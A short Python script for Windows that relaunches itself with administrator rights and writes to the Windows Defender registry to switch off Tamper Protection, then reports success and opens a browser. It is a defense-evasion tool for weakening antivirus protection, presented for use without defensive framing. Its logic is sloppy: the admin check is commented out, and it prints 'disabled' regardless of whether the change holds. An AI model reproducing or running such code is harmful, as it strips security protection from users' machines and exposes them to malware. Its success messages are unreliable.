import winreg as reg
import ctypes
import sys
import webbrowser

def disable_tamper_protection():
    try:
        # Registry path for Tamper Protection
        key_path = r"SOFTWARE\Microsoft\Windows Defender\Features"
        key_name = "TamperProtection"
        
        # Open the registry key for modification
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
            # Set TamperProtection value to 0 (disabled) in hexadecimal
            reg.SetValueEx(key, key_name, 0, reg.REG_DWORD, 0)  # Set to 0 (hexadecimal for disabled)
            print("Tamper Protection has been disabled.")
        
        print("Please restart your system for the changes to take effect.")
        
        # Open Google.com in the default web browser
        webbrowser.open("https://www.google.com")
    
    except PermissionError:
        print("Permission denied. Please run this script as an administrator.")
    except Exception as e:
        print(f"An error occurred: {e}")

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    # if is_admin():
    #     disable_tamper_protection()
    # else:
        # Relaunch the script with administrative privileges
        print("Requesting administrative privileges...")
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 1
        )
        disable_tamper_protection()
